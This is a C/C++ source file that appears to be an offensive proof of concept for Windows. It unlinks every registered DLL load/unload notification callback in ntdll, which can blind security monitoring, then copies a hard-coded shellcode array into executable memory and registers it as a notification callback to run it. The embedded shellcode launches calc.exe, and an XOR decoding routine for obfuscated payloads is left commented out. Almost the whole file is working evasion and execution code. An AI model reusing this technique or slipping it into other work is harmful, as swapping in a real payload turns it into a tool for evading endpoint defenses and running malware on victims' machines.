#include <stdio.h>
#include <Windows.h>

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_DLL_UNLOADED_NOTIFICATION_DATA
{
    ULONG Flags;
        PUNICODE_STRING FullDllName;
        PUNICODE_STRING BaseDllName;
        PVOID DllBase;
    ULONG SizeOfImage;
} LDR_DLL_UNLOADED_NOTIFICATION_DATA, * PLDR_DLL_UNLOADED_NOTIFICATION_DATA;


typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA
{
    ULONG Flags;
    PUNICODE_STRING FullDllName;
    PUNICODE_STRING BaseDllName;
    PVOID DllBase;
    ULONG SizeOfImage;
} LDR_DLL_LOADED_NOTIFICATION_DATA, * PLDR_DLL_LOADED_NOTIFICATION_DATA;

typedef union _LDR_DLL_NOTIFICATION_DATA
{
    LDR_DLL_LOADED_NOTIFICATION_DATA Loaded;
    LDR_DLL_UNLOADED_NOTIFICATION_DATA Unloaded;
} LDR_DLL_NOTIFICATION_DATA, * PLDR_DLL_NOTIFICATION_DATA;

typedef VOID(NTAPI* PLDR_DLL_NOTIFICATION_FUNCTION)(
    _In_ ULONG NotificationReason,
    _In_ PLDR_DLL_NOTIFICATION_DATA NotificationData,
    _In_opt_ PVOID Context
    );

typedef NTSTATUS(NTAPI* ntLdrRegisterDllNotification) (
    _In_     ULONG                          Flags,
    _In_     PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
    _In_opt_ PVOID                          Context,
    _Out_    PVOID* Cookie
    );

VOID some_callback(_In_ ULONG NotificationReason, _In_ PLDR_DLL_NOTIFICATION_DATA NotificationData, _In_opt_ PVOID Context){

    if (NotificationReason == 2) {
        printf("[+] Uloaded %Z\n", NotificationData->Unloaded.BaseDllName);

    }

}

LIST_ENTRY* get_dll_load_notifs(PVOID cookie) {

    const auto LdrpDllNotifList = static_cast<LIST_ENTRY*>(cookie);
    auto entry = LdrpDllNotifList->Flink;

    printf("[!] Entry found at %x\n", entry);
    return entry;
}

void mcpy(void* dest, void* src, size_t n)
{
    // Typecast src and dest addresses to (char *)  
    char* csrc = (char*)src;
    char* cdest = (char*)dest;

    // Copy contents of src[] to dest[]  
    for (int i = 0; i < n; i++)
        cdest[i] = csrc[i];
}

LIST_ENTRY* remove_dll_load_notifs(LIST_ENTRY* entry) {

    // setting the head and the next nodes of linked list
    const auto head = entry;
    auto current = head->Flink;


    // Double Linked list is basically a loop , so the list ends when it comes around to beginning , i.e the head
    while (current != head) {
        printf("[!] Clearing DLL Load/Unload notifications list\n");
        auto next = current->Flink;

        current->Blink->Flink = current->Flink;
        current->Flink->Blink = current->Blink;

        current = next;
    }

    return head;
}

void dx(unsigned char* todo, DWORD szTodo)
{
    for (SIZE_T i = 0; i < szTodo - 1; i++)
    {
        unsigned char result = (todo[i] ^ 0x55) - 1;
        result = result ^ 0x11;
        todo[i] = result;
    }
}

int main()
{
    //#include "buf.h"
    unsigned char sc[276] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x0, 0x0, 0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0xf, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x1, 0xd0, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x1, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x41, 0x8b, 0xc, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x8d, 0x1, 0x1, 0x0, 0x0, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0xa, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x6, 0x7c, 0xa, 0x80, 0xfb, 0xe0, 0x75, 0x5, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x0, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x0 };
    
    //dx(sc, sizeof(sc));
       
    NTSTATUS STATUS = NULL;
    LIST_ENTRY* entry = NULL;

    ntLdrRegisterDllNotification   LdrRegisterDllNotification = (ntLdrRegisterDllNotification)GetProcAddress(LoadLibraryW(L"NTDLL.DLL"), "LdrRegisterDllNotification");

    if (!LdrRegisterDllNotification) {
        printf("[-] Could not locate function\n");
        return -1;
    }

    PVOID cookie;
    if ((STATUS = LdrRegisterDllNotification(0, (PLDR_DLL_NOTIFICATION_FUNCTION)some_callback, NULL, &cookie)) != 0) {
        printf("[-] Failed to register new DLL Notification Callback. Error: %lu\n", GetLastError());
        return -1;
    }

    if (!cookie) {
        printf("[-] Cookie is NULL\n");
        return -1;
    }
    entry = get_dll_load_notifs(cookie);
    if (entry  == NULL) {
        printf("[-] Error getting Notification List entrypoint\n");
        return -1;
    }

    remove_dll_load_notifs(entry);

    // create New DLL load/unload notif entry 

    PVOID exec = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!exec) {
        printf("[-] Error allocating memory. ERROR: %lu\n", GetLastError());
        return -1;
    }

    
    mcpy(exec, sc, sizeof(sc));

    
    if ((STATUS = LdrRegisterDllNotification(0, (PLDR_DLL_NOTIFICATION_FUNCTION)exec, NULL, &cookie)) != 0) {
        printf("[-] Failed to register new DLL Notification Callback. Error: %lu\n", GetLastError());
        return -1;
    }
    

    //FreeLibrary(LoadLibraryA("DBGHELP.dll"));

    //WaitForSingleObject(GetCurrentThread(), 1000);

    printf("[+] Done");
    return 0;
}


